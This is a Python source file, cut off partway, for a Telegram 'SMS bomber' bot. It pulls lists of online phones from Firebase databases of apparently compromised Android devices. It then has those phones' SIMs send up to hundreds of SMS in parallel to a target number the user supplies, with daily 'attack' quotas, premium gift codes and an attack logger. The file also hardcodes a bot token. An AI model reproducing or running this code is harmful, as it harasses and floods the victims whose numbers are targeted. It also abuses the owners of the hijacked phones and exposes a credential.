import os
import json
import logging
import re
import requests
import time
import random
import secrets
import string
from datetime import datetime, timedelta
import pytz
import io
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import asyncio
import aiohttp
import aiofiles

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8785442680:AAEbpRbVb8ACLYookDQeRrGm8VNaH0Yp-vc"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

ADMIN_IDS = [8935807032]  # Main/Owner Admin IDs
DEVELOPER_USERNAME = "@VIP_X_OFFICIAL"
BOT_NAME = "VIPXOFFICIAL_CUSTOM_BOMBER_BOT"

# ==================== SECOND ADMIN CONFIG ====================
SECOND_ADMIN_FILE = "second_admins.json"

# Logger Group Configuration
LOGGER_GROUP_ID = -1003831565434

# Timezone
IST = pytz.timezone('Asia/Kolkata')

# Cache settings
DEVICE_CACHE_TTL = 120

# ==================== GLOBAL VARIABLES ====================
user_states = {}
admin_states = {}
last_update_id = 0
_logger_checked = False
_logger_can_send = True
_channels_resolved = False
_fetching = False

# ==================== DATA FILES ====================
USER_DATA_FILE = "user_data.json"
FIREBASE_FILE = "firebase_configs.json"
DEVICE_CACHE_FILE = "device_cache.json"
ADMIN_SETTINGS_FILE = "admin_settings.json"
GIFT_CODES_FILE = "gift_codes.json"
WELCOME_IMAGE_FILE = "welcome_image.json"

# ==================== DEFAULT SETTINGS ====================
DEFAULT_SETTINGS = {
    "daily_attack_limit": 3,
    "max_sms_per_attack": 100,
    "maintenance_mode": False,
    "broadcast_message": None,
    "last_broadcast": None,
    "parallel_requests": 100
}

# ==================== DATA MANAGEMENT ====================

def load_user_data():
    try:
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_data(data):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_firebase_configs():
    try:
        with open(FIREBASE_FILE, "r") as f:
            data = json.load(f)
            valid = []
            for item in data:
                if isinstance(item, dict):
                    url = item.get("url", "").strip()
                    key = item.get("key", "").strip()
                    if url and key:
                        valid.append(item)
            return valid
    except FileNotFoundError:
        return []
    except Exception as e:
        logger.error(f"Error loading firebase configs: {e}")
        return []

def save_firebase_configs(configs):
    with open(FIREBASE_FILE, "w") as f:
        json.dump(configs, f, indent=2)

def load_device_cache():
    try:
        with open(DEVICE_CACHE_FILE, "r") as f:
            data = json.load(f)
            if "devices" not in data or not isinstance(data["devices"], list):
                data["devices"] = []
            return data
    except FileNotFoundError:
        return {"devices": [], "last_update": None, "total_online": 0, "fetching": False}
    except Exception as e:
        logger.error(f"Error loading device cache: {e}")
        return {"devices": [], "last_update": None, "total_online": 0, "fetching": False}

def save_device_cache(data):
    with open(DEVICE_CACHE_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_admin_settings():
    try:
        with open(ADMIN_SETTINGS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        save_admin_settings(DEFAULT_SETTINGS)
        return DEFAULT_SETTINGS.copy()

def save_admin_settings(data):
    with open(ADMIN_SETTINGS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_gift_codes():
    try:
        with open(GIFT_CODES_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_gift_codes(data):
    with open(GIFT_CODES_FILE, "w") as f:
        json.dump(data, f, indent=2)

def load_welcome_image_info():
    try:
        with open(WELCOME_IMAGE_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {"file_id": None, "caption": "🔥 Welcome to VIPXOFFICIAL Bomber!"}

def save_welcome_image_info(data):
    with open(WELCOME_IMAGE_FILE, "w") as f:
        json.dump(data, f, indent=2)

# ==================== SECOND ADMIN MANAGEMENT ====================

def load_second_admins():
    try:
        with open(SECOND_ADMIN_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return []
    except Exception:
        return []

def save_second_admins(admins):
    with open(SECOND_ADMIN_FILE, "w") as f:
        json.dump(admins, f, indent=2)

def is_second_admin(user_id):
    second_admins = load_second_admins()
    return user_id in second_admins

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_admin_or_second(user_id):
    return is_admin(user_id) or is_second_admin(user_id)

def get_admin_type(user_id):
    if is_admin(user_id):
        return "owner"
    elif is_second_admin(user_id):
        return "second"
    return None

def get_second_admin_panel_text(user_id):
    settings = load_admin_settings()
    users = load_user_data()
    gift_codes = load_gift_codes()
    devices = load_device_cache()
    
    text = f"""👑 VIPXOFFICIAL Admin Panel (Limited)
==========================
👥 Total Users: {len(users)}
🎁 Gift Codes: {len(gift_codes)}
⚡ Online Devices: {len(devices.get('devices', []))}
📊 Daily Attack Limit: {settings.get('daily_attack_limit', 3)}
🎯 Max SMS Per Attack: {settings.get('max_sms_per_attack', 100)}
==========================
📌 Your Access:
✅ Manage Users
✅ Broadcast
✅ Statistics
✅ Gift Codes
❌ Firebase Management
❌ Bot Settings
❌ Welcome Image
❌ Refresh Devices
=========================="""
    return text

# ==================== TIME FUNCTIONS ====================

def get_ist_now():
    return datetime.now(IST)

def format_ist_time(dt):
    if dt.tzinfo is None:
        dt = IST.localize(dt)
    return dt.strftime("%I:%M %p")

def format_ist_datetime(dt):
    if dt.tzinfo is None:
        dt = IST.localize(dt)
    return dt.strftime("%d %b %Y, %I:%M %p")

def get_ist_time_str():
    return get_ist_now().strftime("%I:%M %p")

# ==================== TELEGRAM API FUNCTIONS ====================

def send_message(chat_id, text, reply_markup=None, parse_mode=None):
    url = f"{BASE_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response.json()
    except Exception as e:
        logger.error(f"Send message error: {e}")
        return None

def edit_message(chat_id, message_id, text, reply_markup=None):
    if not message_id:
        return send_message(chat_id, text, reply_markup=reply_markup)
    url = f"{BASE_URL}/editMessageText"
    payload = {"chat_id": chat_id, "message_id": message_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = requests.post(url, json=payload, timeout=30)
        if not response.json().get("ok"):
            return send_message(chat_id, text, reply_markup=reply_markup)
        return response.json()
    except Exception as e:
        logger.error(f"Edit message error: {e}")
        return send_message(chat_id, text, reply_markup=reply_markup)

def delete_message(chat_id, message_id):
    if not message_id:
        return None
    url = f"{BASE_URL}/deleteMessage"
    payload = {"chat_id": chat_id, "message_id": message_id}
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response.json()
    except Exception as e:
        logger.error(f"Delete message error: {e}")
        return None

def answer_callback(callback_id, text=None, show_alert=False):
    url = f"{BASE_URL}/answerCallbackQuery"
    payload = {"callback_query_id": callback_id}
    if text:
        payload["text"] = text
    if show_alert:
        payload["show_alert"] = show_alert
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response.json()
    except Exception as e:
        logger.error(f"Answer callback error: {e}")
        return None

def get_file(file_id):
    url = f"{BASE_URL}/getFile"
    payload = {"file_id": file_id}
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response.json()
    except Exception as e:
        logger.error(f"Get file error: {e}")
        return None

def download_file(file_path):
    url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
    try:
        response = requests.get(url, timeout=60)
        if response.status_code == 200:
            return response.content
        return None
    except Exception as e:
        logger.error(f"Download file error: {e}")
        return None

def get_updates(offset=None):
    url = f"{BASE_URL}/getUpdates"
    payload = {"timeout": 30}
    if offset:
        payload["offset"] = offset
    try:
        response = requests.post(url, json=payload, timeout=35)
        return response.json()
    except Exception as e:
        logger.error(f"Get updates error: {e}")
        return None

def send_photo(chat_id, photo, caption=None, reply_markup=None):
    url = f"{BASE_URL}/sendPhoto"
    payload = {"chat_id": chat_id, "photo": photo}
    if caption:
        payload["caption"] = caption
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = requests.post(url, json=payload, timeout=30)
        return response.json()
    except Exception as e:
        logger.error(f"Send photo error: {e}")
        return None

def send_document(chat_id, document, caption=None, reply_markup=None):
    url = f"{BASE_URL}/sendDocument"
    if hasattr(document, 'read') and hasattr(document, 'name'):
        try:
            document.seek(0)
            files = {'document': (document.name, document, 'text/plain')}
            data = {'chat_id': chat_id}
            if caption:
                data['caption'] = caption
            if reply_markup:
                data['reply_markup'] = json.dumps(reply_markup)
            response = requests.post(url, data=data, files=files, timeout=30)
            return response.json()
        except Exception as e:
            logger.error(f"Send document error: {e}")
            return None
    elif isinstance(document, str) and os.path.exists(document):
        try:
            files = {'document': open(document, 'rb')}
            data = {'chat_id': chat_id}
            if caption:
                data['caption'] = caption
            if reply_markup:
                data['reply_markup'] = json.dumps(reply_markup)
            response = requests.post(url, data=data, files=files, timeout=30)
            return response.json()
        except Exception as e:
            logger.error(f"Send document error: {e}")
            return None
    else:
        payload = {"chat_id": chat_id, "document": document}
        if caption:
            payload["caption"] = caption
        if reply_markup:
            payload["reply_markup"] = json.dumps(reply_markup)
        try:
            response = requests.post(url, json=payload, timeout=30)
            return response.json()
        except Exception as e:
            logger.error(f"Send document error: {e}")
            return None

# ==================== KEYBOARD HELPERS ====================

def make_kb(buttons):
    return {"inline_keyboard": buttons}

def btn(text, callback_data=None, url=None):
    b = {"text": text}
    if callback_data:
        b["callback_data"] = callback_data
    if url:
        b["url"] = url
    return b

# ==================== FIREBASE FUNCTIONS ====================

def fetch_single_firebase(config):
    try:
        url = config.get("url", "").strip().rstrip('/')
        key = config.get("key", "").strip()
        if not url or not key:
            return []
        if not url.startswith("http"):
            url = "https://" + url
        full_url = f"{url}/clients.json?auth={key}"
        response = requests.get(full_url, timeout=10)
        if response.status_code != 200:
            return []
        data = response.json()
        if not data or not isinstance(data, dict):
            return []
        devices = []
        for device_id, device_data in data.items():
            try:
                if isinstance(device_data, dict) and device_data.get("status", False):
                    device_data["id"] = device_id
                    device_data["firebase_url"] = url
                    device_data["firebase_key"] = key
                    devices.append(device_data)
            except:
                continue
        return devices
    except Exception as e:
        logger.error(f"Firebase fetch error: {e}")
        return []

def fetch_all_online_devices():
    global _fetching
    if _fetching:
        return load_device_cache().get("devices", [])
    configs = load_firebase_configs()
    if not configs:
        return []
    _fetching = True
    all_devices = []
    total = len(configs)
    logger.info(f"Fetching devices from {total} Firebase connections...")
    start = time.time()
    batch_size = 20
    for i in range(0, total, batch_size):
        batch = configs[i:i+batch_size]
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(fetch_single_firebase, cfg): cfg for cfg in batch}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    all_devices.extend(result)
    elapsed = time.time() - start
    logger.info(f"Fetched {len(all_devices)} online devices in {elapsed:.2f}s")
    cache = {
        "devices": all_devices,
        "total_online": len(all_devices),
        "last_update": get_ist_now().isoformat(),
        "fetching": False
    }
    save_device_cache(cache)
    _fetching = False
    return all_devices

def get_cached_devices(force=False):
    if force:
        return fetch_all_online_devices()
    cache = load_device_cache()
    devices = cache.get("devices", [])
    if not isinstance(devices, list):
        devices = []
        cache["devices"] = []
        save_device_cache(cache)
    if devices:
        last_update = cache.get("last_update")
        if last_update:
            try:
                last_dt = datetime.fromisoformat(last_update)
                if (get_ist_now() - last_dt).total_seconds() < DEVICE_CACHE_TTL:
                    return devices
            except:
                pass
    if not cache.get("fetching", False):
        threading.Thread(target=fetch_all_online_devices, daemon=True).start()
    return devices

def get_cached_total_devices():
    cache = load_device_cache()
    devices = cache.get("devices", [])
    if not isinstance(devices, list):
        return 0
    return len(devices)

# ==================== PARALLEL SMS SEND FUNCTIONS ====================

async def send_sms_through_device_async(session, device, target_number, message, sim_slot="1"):
    try:
        url = device.get("firebase_url", "").strip().rstrip('/')
        key = device.get("firebase_key", "").strip()
        device_id = device.get("id", "")
        if not url or not key or not device_id:
            return False, "Missing device info"
        
        webhook_path = f"clients/{device_id}/webhookEvent/sendSms"
        full_url = f"{url}/{webhook_path}.json?auth={key}"
        payload = {"from": sim_slot, "to": target_number, "message": message, "isSended": False}
        
        async with session.put(full_url, json=payload, timeout=aiohttp.ClientTimeout(total=5)) as response:
            if response.status in [200, 201, 204]:
                return True, None
            else:
                return False, f"HTTP {response.status}"
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)

async def send_bulk_sms_parallel(target_number, message, count, devices):
    if not devices:
        return {"success": False, "sent": 0, "failed": 0, "message": "No online devices available"}
    
    tasks = []
    device_mapping = []
    
    for device in devices:
        sims = device.get("sims", [])
        available_slots = []
        if sims and len(sims) > 0:
            for sim in sims:
                if isinstance(sim, dict):
                    slot = sim.get("simSlot", "1")
                    if sim.get("status", True) or sim.get("isActive", True):
                        available_slots.append(str(slot))
                else:
                    available_slots.append("1")
        else:
            available_slots = ["1"]
        if not available_slots:
            available_slots = ["1"]
        for slot in available_slots:
            if len(tasks) >= count:
                break
            tasks.append((device, target_number, message, slot))
            device_mapping.append({"device_id": device.get("id", "unknown"), "sim_slot": slot})
    
    tasks = tasks[:count]
    device_mapping = device_mapping[:count]
    
    sent_count = 0
    failed_count = 0
    errors = []
    
    start_time = get_ist_now()
    
    connector = aiohttp.TCPConnector(limit=100, limit_per_host=50)
    async with aiohttp.ClientSession(connector=connector) as session:
        async_tasks = []
        for task_data in tasks:
            device, number, msg, slot = task_data
            async_tasks.append(send_sms_through_device_async(session, device, number, msg, slot))
        
        results = await asyncio.gather(*async_tasks, return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                failed_count += 1
                errors.append(f"Task {i}: {str(result)}")
            elif isinstance(result, tuple):
                success, error = result
                if success:
                    sent_count += 1
                else:
                    failed_count += 1
                    if error:
                        errors.append(f"Device {device_mapping[i]['device_id']} (SIM {device_mapping[i]['sim_slot']}): {error}")
    
    end_time = get_ist_now()
    elapsed = (end_time - start_time).total_seconds()
    
    return {
        "success": sent_count > 0,
        "sent": sent_count,
        "failed": failed_count,
        "errors": errors[:5],
        "total_devices": len(devices),
        "total_attempts": len(tasks),
        "elapsed_time": f"{elapsed:.2f}s"
    }

def send_bulk_sms(target_number, message, count, devices):
    if not devices:
        return {"success": False, "sent": 0, "failed": 0, "message": "No online devices available"}
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(send_bulk_sms_parallel(target_number, message, count, devices))
        loop.close()
        return result
    except Exception as e:
        logger.error(f"Parallel SMS error: {e}")
        return send_bulk_sms_sequential(target_number, message, count, devices)

def send_bulk_sms_sequential(target_number, message, count, devices):
    if not devices:
        return {"success": False, "sent": 0, "failed": 0, "message": "No online devices available"}
    
    tasks = []
    device_mapping = []
    
    for device in devices:
        sims = device.get("sims", [])
        available_slots = []
        if sims and len(sims) > 0:
            for sim in sims:
                if isinstance(sim, dict):
                    slot = sim.get("simSlot", "1")
                    if sim.get("status", True) or sim.get("isActive", True):
                        available_slots.append(str(slot))
                else:
                    available_slots.append("1")
        else:
            available_slots = ["1"]
        if not available_slots:
            available_slots = ["1"]
        for slot in available_slots:
            if len(tasks) >= count:
                break
            tasks.append((device, target_number, message, slot))
            device_mapping.append({"device_id": device.get("id", "unknown"), "sim_slot": slot})
    
    tasks = tasks[:count]
    device_mapping = device_mapping[:count]
    sent_count = 0
    failed_count = 0
    errors = []
    start_time = get_ist_now()
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        future_to_task = {executor.submit(send_sms_through_device, *task): task for task in tasks}
        for i, future in enumerate(future_to_task):
            success, error = future.result()
            if success:
                sent_count += 1
            else:
                failed_count += 1
                if error:
                    errors.append(f"Device {device_mapping[i]['device_id']} (SIM {device_mapping[i]['sim_slot']}): {error}")
    
    end_time = get_ist_now()
    elapsed = (end_time - start_time).total_seconds()
    return {
        "success": sent_count > 0,
        "sent": sent_count,
        "failed": failed_count,
        "errors": errors[:5],
        "total_devices": len(devices),
        "total_attempts": len(tasks),
        "elapsed_time": f"{elapsed:.2f}s"
    }

def send_sms_through_device(device, target_number, message, sim_slot="1"):
    try:
        url = device.get("firebase_url", "").strip().rstrip('/')
        key = device.get("firebase_key", "").strip()
        device_id = device.get("id", "")
        if not url or not key or not device_id:
            return False, "Missing device info"
        webhook_path = f"clients/{device_id}/webhookEvent/sendSms"
        full_url = f"{url}/{webhook_path}.json?auth={key}"
        payload = {"from": sim_slot, "to": target_number, "message": message, "isSended": False}
        response = requests.put(full_url, json=payload, timeout=5)
        if response.status_code in [200, 201, 204]:
            return True, None
        else:
            return False, f"HTTP {response.status_code}"
    except requests.Timeout:
        return False, "Timeout"
    except Exception as e:
        return False, str(e)

# ==================== USER MANAGEMENT ====================

def get_user_data(user_id):
    data = load_user_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {
            "id": user_id,
            "daily_attacks": 0,
            "last_reset": get_ist_now().isoformat(),
            "total_sms_sent": 0,
            "last_attack_time": None,
            "username": None,
            "first_name": None,
            "daily_attack_limit": None,
            "max_sms_per_attack": None,
            "is_premium": False,
            "premium_expiry": None,
            "premium_code": None,
            "first_join": get_ist_now().isoformat(),
            "logged_join": False
        }
        save_user_data(data)
    return data[uid]

def update_user_data(user_id, updates):
    data = load_user_data()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"id": user_id}
    data[uid].update(updates)
    save_user_data(data)

def reset_daily_attacks_if_needed(user_data):
    if not user_data.get("last_reset"):
        user_data["last_reset"] = get_ist_now().isoformat()
        user_data["daily_attacks"] = 0
        return user_data
    last_reset = datetime.fromisoformat(user_data["last_reset"])
    if last_reset.tzinfo is None:
        last_reset = IST.localize(last_reset)
    if get_ist_now() - last_reset > timedelta(hours=24):
        user_data["last_reset"] = get_ist_now().isoformat()
        user_data["daily_attacks"] = 0
    return user_data

def check_premium_expiry(user_data):
    if not user_data.get("is_premium", False):
        return user_data
    expiry_date = user_data.get("premium_expiry")
    if expiry_date:
        expiry = datetime.fromisoformat(expiry_date)
        if get_ist_now() > expiry:
            user_data["is_premium"] = False
            user_data["daily_attack_limit"] = None
            user_data["max_sms_per_attack"] = None
            user_data["premium_expiry"] = None
            user_data["premium_code"] = None
    return user_data

def get_user_limits(user_data):
    settings = load_admin_settings()
    default_daily = settings.get("daily_attack_limit", 3)
    default_sms = settings.get("max_sms_per_attack", 100)
    user_data = check_premium_expiry(user_data)
    daily_limit = user_data.get("daily_attack_limit") or default_daily
    sms_limit = user_data.get("max_sms_per_attack") or default_sms
    return daily_limit, sms_limit

def can_user_attack(user_data):
    daily_limit, _ = get_user_limits(user_data)
    user_data = reset_daily_attacks_if_needed(user_data)
    if user_data["daily_attacks"] >= daily_limit:
        remaining = daily_limit - user_data["daily_attacks"]
        return False, f"Daily attack limit reached! Remaining: {remaining}"
    return True, "Ready"

def get_user_status_text(user_id):
    user_data = get_user_data(user_id)
    user_data = reset_daily_attacks_if_needed(user_data)
    daily_limit, max_sms = get_user_limits(user_data)
    used = user_data["daily_attacks"]
    remaining = daily_limit - used
    total_sms = user_data.get("total_sms_sent", 0)
    last_reset = datetime.fromisoformat(user_data["last_reset"])
    if last_reset.tzinfo is None:
        last_reset = IST.localize(last_reset)
    reset_time = last_reset + timedelta(hours=24)
    time_left = get_ist_now() - reset_time
    if time_left.total_seconds() < 0:
        time_left = -time_left
        hours = int(time_left.total_seconds() // 3600)
        minutes = int((time_left.total_seconds() % 3600) // 60)
        reset_timer = f"{hours}h {minutes}m"
    else:
        reset_timer = "Ready"
    online_devices = get_cached_total_devices()
    premium_status = "👑 Premium" if user_data.get("is_premium", False) else "🔰 Normal"
    return f"""🔥 Welcome to VIPXOFFICIAL Bomber 🔥
==========================
💣 VIPXOFFICIAL High-Speed SMS Bomber 💣
==========================
👤 User: {user_data.get('username', 'VIP_X_OFFICIAL™')}
🔑 ID: {user_id}
📌 Status: {premium_status}
🎰 Daily Attacks: {used}/{daily_limit} used ({remaining} left)
🎯 Max SMS Per Attack: {max_sms} SMS
⏳ Reset Timer: {reset_timer}
⚡ Active Devices: {online_devices}
==========================
👑 Developer: {DEVELOPER_USERNAME}
=========================="""

def get_profile_text(user_id):
    user_data = get_user_data(user_id)
    user_data = reset_daily_attacks_if_needed(user_data)
    daily_limit, max_sms = get_user_limits(user_data)
    used = user_data["daily_attacks"]
    remaining = daily_limit - used
    total_sms = user_data.get("total_sms_sent", 0)
    last_reset = datetime.fromisoformat(user_data["last_reset"])
    if last_reset.tzinfo is None:
        last_reset = IST.localize(last_reset)
    reset_time = last_reset + timedelta(hours=24)
    time_left = reset_time - get_ist_now()
    if time_left.total_seconds() > 0:
        hours = int(time_left.total_seconds() // 3600)
        minutes = int((time_left.total_seconds() % 3600) // 60)
        reset_timer = f"{hours}h {minutes}m"
    else:
        reset_timer = "Ready"
    premium_status = "✅ Premium" if user_data.get("is_premium", False) else "❌ Normal"
    expiry = user_data.get("premium_expiry")
    expiry_text = format_ist_datetime(datetime.fromisoformat(expiry)) if expiry else "Not Premium"
    return f"""📊 VIPXOFFICIAL USER PROFILE

👤 Name: {user_data.get('username', 'VIP_X_OFFICIAL™')}
🔑 ID: {user_id}
📌 Status: {'Admin' if user_id in ADMIN_IDS else 'Normal User'}
👑 Premium: {premium_status}
⏳ Premium Expiry: {expiry_text}

📊 Daily Attack Slots: {used}/{daily_limit} Used
💫 Slots Remaining: {remaining}/{daily_limit}
🎯 Max SMS Limit: {max_sms} SMS
⏳ 24h Reset In: {reset_timer}
📨 Total SMS Sent: {total_sms}

Both Free & Paid users get max {max_sms} SMS per attack by default."""

# ==================== GIFT CODE FUNCTIONS ====================

def generate_gift_code():
    characters = string.ascii_uppercase + string.digits
    code = ''.join(secrets.choice(characters) for _ in range(8))
    return f"VIP-{code}"

def create_gift_code(daily_limit, sms_limit, expiry_days):
    code = generate_gift_code()
    expiry_date = get_ist_now() + timedelta(days=expiry_days)
    return {
        "code": code,
        "daily_attack_limit": daily_limit,
        "max_sms_per_attack": sms_limit,
        "expiry_date": expiry_date.isoformat(),
        "created_at": get_ist_now().isoformat(),
        "used_by": None,
        "is_used": False
    }

def redeem_gift_code(user_id, code):
    gift_codes = load_gift_codes()
    if code not in gift_codes:
        return {"success": False, "message": "❌ Invalid gift code."}
    gift = gift_codes[code]
    if gift.get("is_used", False):
        return {"success": False, "message": "❌ This code has already been used."}
    expiry_date = datetime.fromisoformat(gift["expiry_date"])
    if get_ist_now() > expiry_date:
        return {"success": False, "message": "❌ This code has expired."}
    user_data = get_user_data(user_id)
    user_data["daily_attack_limit"] = gift["daily_attack_limit"]
    user_data["max_sms_per_attack"] = gift["max_sms_per_attack"]
    user_data["premium_expiry"] = gift["expiry_date"]
    user_data["is_premium"] = True
    user_data["premium_code"] = code
    update_user_data(user_id, user_data)
    gift["is_used"] = True
    gift["used_by"] = user_id
    gift["used_at"] = get_ist_now().isoformat()
    gift_codes[code] = gift
    save_gift_codes(gift_codes)
    return {
        "success": True,
        "message": f"✅ Premium activated successfully!\n\n📊 Daily Attack Limit: {gift['daily_attack_limit']}\n🎯 Max SMS Per Attack: {gift['max_sms_per_attack']}\n⏳ Expiry: {format_ist_datetime(datetime.fromisoformat(gift['expiry_date']))}",
        "daily_limit": gift["daily_attack_limit"],
        "sms_limit": gift["max_sms_per_attack"],
        "expiry": gift["expiry_date"]
    }

# ==================== LOGGER FUNCTIONS ====================

def mask_phone_number(phone):
    if not phone:
        return "Unknown"
    digits = re.sub(r'\D', '', phone)
    if len(digits) < 6:
        return phone
    return f"{digits[:3]}****{digits[-3:]}"

def send_logger_message(message):
    try:
        send_message(LOGGER_GROUP_ID, message)
    except Exception as e:
        logger.info(f"LOGGER (console): {message[:200]}")

def log_new_user(user_id, username, first_name):
    message = f"""🆕 New User Joined
━━━━━━━━━━━━━━━━━━
👤 User: {username or 'No username'}
🆔 ID: {user_id}
📛 Name: {first_name or 'Unknown'}
📅 Time: {get_ist_time_str()} IST
━━━━━━━━━━━━━━━━━━
Status: 🟢 Active"""
    send_logger_message(message)

def log_attack(user_id, username, target, count, sent, failed, elapsed):
    masked_target = mask_phone_number(target)
    message = f"""💣 New Attack
━━━━━━━━━━━━━━━━━━
👤 User: {username or 'Unknown'}
🆔 ID: {user_id}
🎯 Target: {masked_target}
📊 Count: {count}
━━━━━━━━━━━━━━━━━━
✅ Sent: {sent}
❌ Failed: {failed}
⏱ Time: {elapsed}
📅 Time: {get_ist_time_str()} IST
━━━━━━━━━━━━━━━━━━
Status: {'✅ Success' if sent > 0 else '❌ Failed'}"""
    send_logger_message(message)

# ==================== BOT HANDLERS ====================

def handle_start(chat_id, user_id, message_id=None):
    settings = load_admin_settings()
    if settings.get("maintenance_mode", False):
        keyboard = make_kb([[btn("👑 CONTACT ADMIN", url=f"https://t.me/{DEVELOPER_USERNAME.replace('@', '')}")]])
        send_message(chat_id, "🔧 Maintenance Mode\n\nThe bot is currently under maintenance.\nPlease try again later.", reply_markup=keyboard)
        return
    
    user_data = get_user_data(user_id)
    username = user_data.get('username') or "VIP_X_OFFICIAL™"
    user_data["username"] = username
    try:
        resp = requests.get(f"{BASE_URL}/getChat", params={"chat_id": user_id})
        if resp.status_code == 200:
            data = resp.json()
            if data.get("ok"):
                user_data["first_name"] = data["result"].get("first_name", "Unknown")
    except:
        user_data["first_name"] = "Unknown"
    if not user_data.get("logged_join", False):
        log_new_user(user_id, username, user_data["first_name"])
        user_data["logged_join"] = True
        user_data["first_join"] = get_ist_now().isoformat()
        update_user_data(user_id, user_data)
    else:
        update_user_data(user_id, user_data)
    if not load_device_cache().get("devices"):
        threading.Thread(target=fetch_all_online_devices, daemon=True).start()
    status_text = get_user_status_text(user_id)
    keyboard = make_kb([
        [btn("🚀 START BOMBING", callback_data="start_bombing")],
        [btn("🎁 REDEEM GIFT CODE", callback_data="redeem_gift"), btn("📊 MY PROFILE", callback_data="my_profile")],
        [btn("📈 STATS", callback_data="stats")]
    ])
    
    admin_type = get_admin_type(user_id)
    if admin_type == "owner":
        keyboard["inline_keyboard"].append([btn("👑 ADMIN PANEL (Full)", callback_data="admin_panel")])
    elif admin_type == "second":
        keyboard["inline_keyboard"].append([btn("👑 ADMIN PANEL (Limited)", callback_data="admin_panel_second")])
    
    keyboard["inline_keyboard"].append([btn("👑 SUPPORT", url=f"https://t.me/{DEVELOPER_USERNAME.replace('@', '')}")])
    
    welcome_info = load_welcome_image_info()
    file_id = welcome_info.get("file_id")
    if file_id:
        try:
            send_photo(chat_id, file_id, caption=status_text[:1000], reply_markup=keyboard)
            return
        except:
            pass
    send_message(chat_id, status_text, reply_markup=keyboard)

def handle_callback(callback_query, chat_id, user_id, message_id):
    if isinstance(callback_query, dict):
        cb_data = callback_query.get("data", "")
        cb_id = callback_query.get("id", "")
    else:
        cb_data = str(callback_query)
        cb_id = callback_query
    
    answer_callback(cb_id)
    
    settings = load_admin_settings()
    if settings.get("maintenance_mode", False) and cb_data not in ["admin_panel","admin_panel_second","admin_back","admin_settings","admin_toggle_maintenance"] and user_id not in ADMIN_IDS and not is_second_admin(user_id):
        keyboard = make_kb([[btn("👑 CONTACT ADMIN", url=f"https://t.me/{DEVELOPER_USERNAME.replace('@', '')}")]])
        edit_message(chat_id, message_id, "🔧 Maintenance Mode\n\nThe bot is currently under maintenance.\nPlease try again later.", reply_markup=keyboard)
        return
    
    if cb_data == "back_to_menu":
        delete_message(chat_id, message_id)
        handle_start(chat_id, user_id)
        return
    
    if cb_data == "start_bombing":
        user_data = get_user_data(user_id)
        if settings.get("maintenance_mode", False):
            keyboard = make_kb([[btn("🔙 BACK", callback_data="back_to_menu")]])
            send_message(chat_id, "🔧 Maintenance Mode\n\nThe bot is currently under maintenance.\nPlease try again later.", reply_markup=keyboard)
            return
        can, msg = can_user_attack(user_data)
        if not can:
            keyboard = make_kb([[btn("🔙 BACK", callback_data="back_to_menu")]])
            send_message(chat_id, f"❌ {msg}\n\nPlease wait for reset or contact admin.", reply_markup=keyboard)
            return
        user_states[user_id] = {"step": "target"}
        keyboard = make_kb([[btn("❌ CANCEL", callback_data="cancel")]])
        send_message(chat_id, "📱 Enter Target Phone Number\nSend target Indian mobile number (e.g. +919876543210 or 9876543210):\n\nSend /cancel to cancel.", reply_markup=keyboard)
        return
    
    if cb_data == "redeem_gift":
        keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
        send_message(chat_id, "🎁 Redeem Gift Code\n\nSend your gift code to redeem premium features.\n\nFormat: VIP-XXXXX\n\nSend /cancel to cancel.", reply_markup=keyboard)
        return
    
    if cb_data == "my_profile":
        profile_text = get_profile_text(user_id)
        keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
        delete_message(chat_id, message_id)
        send_message(chat_id, profile_text, reply_markup=keyboard)
        return
    
    if cb_data == "stats":
        online_devices = get_cached_total_devices()
        users = load_user_data()
        settings = load_admin_settings()
        stats_text = f"""📈 VIPXOFFICIAL STATISTICS

⚡ Active Devices: {online_devices}
👥 Total Users: {len(users)}
📡 Firebase Connections: {len(load_firebase_configs())}
📊 Daily Limit: {settings.get('daily_attack_limit', 3)}
🎯 SMS Limit: {settings.get('max_sms_per_attack', 100)}
🔄 Last Updated: {get_ist_time_str()} IST

📌 Device count updates automatically."""
        keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
        delete_message(chat_id, message_id)
        send_message(chat_id, stats_text, reply_markup=keyboard)
        return
    
    if cb_data == "stop_attack":
        keyboard = make_kb([[btn("🔙 BACK", callback_data="back_to_menu")]])
        delete_message(chat_id, message_id)
        send_message(chat_id, "🛑 Attack Stopped by User!", reply_markup=keyboard)
        if user_id in user_states:
